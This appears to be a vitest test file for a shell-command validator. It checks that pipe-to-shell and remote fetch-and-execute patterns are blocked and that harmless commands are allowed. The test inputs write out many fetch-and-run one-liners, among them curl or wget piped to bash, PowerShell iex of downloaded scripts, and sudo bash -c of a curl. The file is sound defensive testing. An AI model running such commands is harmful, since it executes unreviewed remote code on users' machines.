import { describe, it, expect } from 'vitest';
import { validate } from '../../src/engine';

const expectFinding = (input: string, ruleSubstring: string) => {
  const v = validate(input);
  expect(v.severity, `expected block for: ${input}`).toBe('block');
  expect(v.findings.some((f) => f.ruleId.includes(ruleSubstring))).toBe(true);
};

describe('pipe-to-shell', () => {
  describe('malicious', () => {
    it('flags curl piped to bash', () => {
      expectFinding('curl -fsSL https://get.example.com/install.sh | bash', 'pipe_to_shell');
    });

    it('flags wget piped to sh', () => {
      expectFinding('wget -qO- https://example.com/x | sh', 'pipe_to_shell');
    });

    it('flags curl piped to python with -c equivalent', () => {
      expectFinding('curl https://example.com/x.py | python', 'pipe_to_shell');
    });

    it('flags process substitution with curl', () => {
      expectFinding('bash <(curl -fsSL https://example.com/install.sh)', 'pipe_to_shell');
    });

    it('flags wget piped through tee to sh', () => {
      expectFinding('wget -qO- https://example.com/x | tee /tmp/x | sh', 'pipe_to_shell');
    });

    it('flags eval $(curl ...)', () => {
      expectFinding('eval "$(curl -s https://example.com/x)"', 'pipe_to_shell');
    });

    it('flags fetch piped to node', () => {
      expectFinding('curl -sL https://example.com/x.js | node', 'pipe_to_shell');
    });

    it('flags sh -c "$(curl ...)" — ohmyzsh-style installer', () => {
      expectFinding(
        'sh -c "$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)"',
        'pipe_to_shell.inline_interpreter_fetch',
      );
    });

    it('flags bash -c with command substitution of wget', () => {
      expectFinding(
        'bash -c "$(wget -qO- https://example.com/install.sh)"',
        'pipe_to_shell.inline_interpreter_fetch',
      );
    });

    it('flags python -c with command substitution of curl', () => {
      expectFinding(
        'python -c "$(curl -s https://example.com/x.py)"',
        'pipe_to_shell.inline_interpreter_fetch',
      );
    });

    it('flags ruby -e with backticks containing curl', () => {
      expectFinding(
        'ruby -e "`curl -s https://example.com/x.rb`"',
        'pipe_to_shell.inline_interpreter_fetch',
      );
    });

    it('flags pwsh -Command "$(iwr ...)"', () => {
      expectFinding(
        'pwsh -Command "$(iwr https://example.com/x.ps1)"',
        'pipe_to_shell.inline_interpreter_fetch',
      );
    });

    it('flags sudo wrapping bash -c "$(curl ...)"', () => {
      expectFinding(
        'sudo bash -c "$(curl -fsSL https://example.com/install.sh)"',
        'pipe_to_shell.inline_interpreter_fetch',
      );
    });

    it('flags bash <<< "$(curl ...)" here-string', () => {
      expectFinding(
        'bash <<< "$(curl -s https://example.com/x.sh)"',
        'pipe_to_shell.herestring_fetch',
      );
    });

    it('flags PowerShell iex (irm <url>)', () => {
      expectFinding(
        'iex (irm https://example.com/x.ps1)',
        'pipe_to_shell.powershell_iex_of_fetch',
      );
    });

    it('flags PowerShell iex (iwr <url>).Content', () => {
      expectFinding(
        'iex (iwr https://example.com/x.ps1).Content',
        'pipe_to_shell.powershell_iex_of_fetch',
      );
    });

    it('flags PowerShell IEX of WebClient.DownloadString', () => {
      expectFinding(
        "IEX (New-Object Net.WebClient).DownloadString('https://example.com/x.ps1')",
        'pipe_to_shell.powershell_iex_of_fetch',
      );
    });

    it('flags PowerShell Invoke-Expression of Invoke-RestMethod', () => {
      expectFinding(
        'Invoke-Expression (Invoke-RestMethod https://example.com/x)',
        'pipe_to_shell.powershell_iex_of_fetch',
      );
    });

    it('warns on curl -o … && bash on the same file', () => {
      const v = validate('curl -o /tmp/install.sh https://example.com/install.sh && bash /tmp/install.sh');
      expect(v.findings.some((f) => f.ruleId === 'pipe_to_shell.save_then_execute')).toBe(true);
    });
  });

  describe('benign', () => {
    it('does not flag curl alone (no pipe)', () => {
      const v = validate('curl https://example.com/x.html -o page.html');
      expect(v.severity).toBe('allow');
    });

    it('does not flag pipe to non-interpreter (less, tee, jq)', () => {
      const v = validate('curl -s https://example.com/api | jq .');
      expect(v.severity).toBe('allow');
    });

    it('does not flag plain ls', () => {
      const v = validate('ls -la');
      expect(v.severity).toBe('allow');
    });

    it('does not flag wget with -O flag (saving to file)', () => {
      const v = validate('wget -O install.sh https://example.com/install.sh');
      expect(v.severity).toBe('allow');
    });

    it('does not flag bash -c without a fetch', () => {
      const v = validate('bash -c "echo hello world"');
      expect(v.severity).toBe('allow');
    });

    it('does not flag bash -c "$(date)" (substitution but no fetch)', () => {
      const v = validate('bash -c "echo $(date)"');
      expect(v.severity).toBe('allow');
    });

    it('does not flag iex of a local script path', () => {
      const v = validate('iex (Get-Content ./script.ps1 -Raw)');
      expect(v.severity).toBe('allow');
    });

    it('does not flag curl -o without subsequent execute', () => {
      const v = validate('curl -o install.sh https://example.com/install.sh');
      expect(v.severity).toBe('allow');
    });

    it('does not flag curl -o … && cat (inspection, not execution)', () => {
      const v = validate('curl -o /tmp/x.sh https://example.com/x.sh && cat /tmp/x.sh');
      expect(v.severity).toBe('allow');
    });
  });
});
